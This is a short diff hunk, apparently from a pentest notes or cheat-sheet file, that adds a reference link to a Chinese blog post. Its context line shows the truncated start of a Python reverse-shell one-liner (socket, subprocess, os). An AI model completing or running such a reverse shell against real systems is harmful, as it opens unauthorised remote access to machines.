@@ -40,7 +40,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 
 
-
+参考：https://www.bodkin.ren/index.php/archives/298/
 
 
 
